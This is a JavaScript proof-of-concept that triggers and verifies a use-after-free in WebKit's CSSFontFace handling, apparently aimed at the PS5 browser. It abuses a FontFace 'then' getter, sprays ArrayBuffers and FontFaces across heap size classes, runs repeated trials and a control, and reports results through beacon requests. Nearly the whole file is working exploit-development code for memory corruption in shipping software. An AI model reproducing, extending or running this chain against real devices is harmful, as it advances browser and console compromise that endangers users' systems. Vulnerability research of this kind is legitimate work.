// p459-uaf-verify.js — UAF write verification via AB spray
//
// CHAIN: eager promise → setProperty in getter → adopt → old CSSFontFace freed
// → m_status = Success (0x03) writes 1 byte to freed memory
//
// CSSFontFace uses WTF_MAKE_FAST_ALLOCATED (FastMalloc), SAME heap as AB backing
// stores (Gigacage disabled on PS5). So AB spray CAN reclaim the freed slot.
//
// Strategy: spray ABs filled with 0xCC across multiple size classes. After the
// UAF write, scan all ABs for any byte that changed from 0xCC. A byte becoming
// 0x03 at a consistent offset = confirmed UAF write to m_status.
(function() {
    var RUN = 'v459-' + Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);

    // ═══════════════════════════════════════════════════════════════
    // TEST A: Multi-size AB spray — find CSSFontFace allocation size
    // ═══════════════════════════════════════════════════════════════
    try {
        var aLog = [];

        var styleA = document.createElement('style');
        styleA.textContent = "@font-face { font-family: 'v459a'; src: local('Arial'); }";
        document.head.appendChild(styleA);
        var spanA = document.createElement('span');
        spanA.style.fontFamily = "'v459a', serif";
        spanA.textContent = 'UAF-VERIFY';
        document.body.appendChild(spanA);
        document.body.offsetHeight;

        var ruleA = styleA.sheet.cssRules[0];
        var faceA = null;
        var itA = document.fonts.values();
        var eA;
        while (!(eA = itA.next()).done) {
            if (eA.value.family.replace(/['"]/g, '') === 'v459a') { faceA = eA.value; break; }
        }

        if (!faceA) { B('A-DEAD', 'NO-FACE'); }
        else {
            var thenA = 0;
            var sprayABs = [];
            var SIZES = [128, 160, 192, 224, 256, 288, 320, 352, 384, 416, 448, 480, 512];
            var PER_SIZE = 200;

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenA++;
                aLog.push('THEN-' + thenA + '-status=' + faceA.status);

                if (thenA === 1) {
                    ruleA.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight;
                    aLog.push('ADOPTED-status=' + faceA.status);

                    // Spray ABs across all size classes, filled with 0xCC
                    for (var si = 0; si < SIZES.length; si++) {
                        var sz = SIZES[si];
                        for (var j = 0; j < PER_SIZE; j++) {
                            var ab = new ArrayBuffer(sz);
                            var v = new Uint8Array(ab);
                            for (var k = 0; k < sz; k++) v[k] = 0xCC;
                            sprayABs.push({ab: ab, v: v, sz: sz, idx: sprayABs.length});
                        }
                    }
                    aLog.push('SPRAYED-' + sprayABs.length);
                }
                return undefined;
            }, configurable: true });

            aLog.push('EAGER');
            var promiseA = faceA.loaded;
            promiseA.catch(function(){});

            aLog.push('LOAD');
            faceA.load();
            aLog.push('DONE-status=' + faceA.status);

            try { delete FontFace.prototype.then; } catch(e) {}

            B('A-RESULT', {log: aLog, thenCount: thenA});

            // Scan ALL ABs for any byte != 0xCC
            var hits = [];
            for (var i = 0; i < sprayABs.length; i++) {
                var item = sprayABs[i];
                var v = item.v;
                for (var off = 0; off < item.sz; off++) {
                    if (v[off] !== 0xCC) {
                        var context = [];
                        for (var c = Math.max(0, off - 4); c < Math.min(item.sz, off + 8); c++) {
                            context.push(v[c].toString(16).padStart(2, '0'));
                        }
                        hits.push({
                            i: i, sz: item.sz, off: off,
                            got: '0x' + v[off].toString(16).padStart(2, '0'),
                            ctx: context.join(' ')
                        });
                        break;
                    }
                }
            }
            B('A-SCAN', {total: sprayABs.length, hits: hits.length, details: hits.slice(0, 30)});
            sprayABs = null;
        }
    } catch(e) { B('A-ERR', e.message.slice(0, 300)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST B: Repeated trials — confirm reproducibility
    // Run 5 iterations of the same chain, each with fresh faces
    // ═══════════════════════════════════════════════════════════════
    try {
        var bResults = [];

        for (var trial = 0; trial < 5; trial++) {
            var fam = 'v459b' + trial;
            var stB = document.createElement('style');
            stB.textContent = "@font-face { font-family: '" + fam + "'; src: local('Arial'); }";
            document.head.appendChild(stB);

            var spB = document.createElement('span');
            spB.style.fontFamily = "'" + fam + "', serif";
            spB.textContent = 'T' + trial;
            document.body.appendChild(spB);
            document.body.offsetHeight;

            var rlB = stB.sheet.cssRules[0];
            var fB = null;
            var itB = document.fonts.values();
            var eB;
            while (!(eB = itB.next()).done) {
                if (eB.value.family.replace(/['"]/g, '') === fam) { fB = eB.value; break; }
            }

            if (!fB) { bResults.push({trial: trial, result: 'NO-FACE'}); continue; }

            var tB = 0;
            var spray = [];

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                tB++;
                if (tB > 1) return undefined;

                rlB.style.setProperty('font-weight', (trial % 2 === 0) ? 'bold' : '900');
                document.body.offsetHeight;

                // Spray FontFaces to detect via status corruption
                for (var j = 0; j < 500; j++) {
                    var ff = new FontFace('sp' + trial + '_' + j, "local('ZZZZZ_No_" + trial + '_' + j + "')");
                    document.fonts.add(ff);
                    spray.push(ff);
                }

                // Also spray some ABs at 256-384 range
                for (var sz = 256; sz <= 384; sz += 16) {
                    for (var jj = 0; jj < 30; jj++) {
                        var ab = new ArrayBuffer(sz);
                        var vv = new Uint8Array(ab);
                        for (var kk = 0; kk < sz; kk++) vv[kk] = 0xBB;
                        spray.push({ab: ab, v: vv, sz: sz});
                    }
                }

                return undefined;
            }, configurable: true });

            var pB = fB.loaded;
            pB.catch(function(){});
            fB.load();

            try { delete FontFace.prototype.then; } catch(e) {}

            // Check FontFace spray
            var loadedIdxs = [];
            var abHits = [];
            for (var j = 0; j < spray.length; j++) {
                if (spray[j] instanceof FontFace) {
                    if (spray[j].status === 'loaded') loadedIdxs.push(j);
                } else if (spray[j].v) {
                    for (var off = 0; off < spray[j].sz; off++) {
                        if (spray[j].v[off] !== 0xBB) {
                            abHits.push({j: j, sz: spray[j].sz, off: off, got: spray[j].v[off]});
                            break;
                        }
                    }
                }
            }

            bResults.push({
                trial: trial,
                thenFired: tB,
                status: fB.status,
                ffLoaded: loadedIdxs.slice(0, 10),
                abHits: abHits.slice(0, 10)
            });

            // Cleanup spray faces
            for (var j = 0; j < spray.length; j++) {
                if (spray[j] instanceof FontFace) {
                    try { document.fonts.delete(spray[j]); } catch(e) {}
                }
            }
            spray = null;
        }

        B('B-RESULTS', {trials: bResults});
    } catch(e) { B('B-ERR', e.message.slice(0, 300)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST C: Control — NO setProperty (no adopt, no free)
    // Same eager promise + spray but WITHOUT setProperty.
    // If any spray shows corruption → false positive (not UAF).
    // ═══════════════════════════════════════════════════════════════
    try {
        var stC = document.createElement('style');
        stC.textContent = "@font-face { font-family: 'v459ctrl'; src: local('Arial'); }";
        document.head.appendChild(stC);

        var spC = document.createElement('span');
        spC.style.fontFamily = "'v459ctrl', serif";
        spC.textContent = 'CTRL';
        document.body.appendChild(spC);
        document.body.offsetHeight;

        var fC = null;
        var itC = document.fonts.values();
        var eC;
        while (!(eC = itC.next()).done) {
            if (eC.value.family.replace(/['"]/g, '') === 'v459ctrl') { fC = eC.value; break; }
        }

        if (!fC) { B('C-DEAD', 'NO-FACE'); }
        else {
            var tC = 0;
            var ctrlSpray = [];

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                tC++;
                if (tC > 1) return undefined;

                // NO setProperty — just spray
                for (var j = 0; j < 500; j++) {
                    var ff = new FontFace('ctrl_' + j, "local('ZZZZZ_Ctrl_" + j + "')");
                    document.fonts.add(ff);
                    ctrlSpray.push(ff);
                }
                for (var sz = 256; sz <= 384; sz += 16) {
                    for (var jj = 0; jj < 30; jj++) {
                        var ab = new ArrayBuffer(sz);
                        var vv = new Uint8Array(ab);
                        for (var kk = 0; kk < sz; kk++) vv[kk] = 0xAA;
                        ctrlSpray.push({ab: ab, v: vv, sz: sz});
                    }
                }
                return undefined;
            }, configurable: true });

            var pC = fC.loaded;
            pC.catch(function(){});
            fC.load();

            try { delete FontFace.prototype.then; } catch(e) {}

            var ctrlLoaded = [];
            var ctrlAbHits = [];
            for (var j = 0; j < ctrlSpray.length; j++) {
                if (ctrlSpray[j] instanceof FontFace) {
                    if (ctrlSpray[j].status === 'loaded') ctrlLoaded.push(j);
                } else if (ctrlSpray[j].v) {
                    for (var off = 0; off < ctrlSpray[j].sz; off++) {
                        if (ctrlSpray[j].v[off] !== 0xAA) {
                            ctrlAbHits.push({j: j, sz: ctrlSpray[j].sz, off: off, got: ctrlSpray[j].v[off]});
                            break;
                        }
                    }
                }
            }

            B('C-CTRL', {
                ffLoaded: ctrlLoaded.length,
                abHits: ctrlAbHits.length,
                ffDetail: ctrlLoaded.slice(0, 10),
                abDetail: ctrlAbHits.slice(0, 10)
            });
        }
    } catch(e) { B('C-ERR', e.message.slice(0, 300)); }

    B('ALIVE', 'all-tests-done');
    B('DONE', RUN);
})();
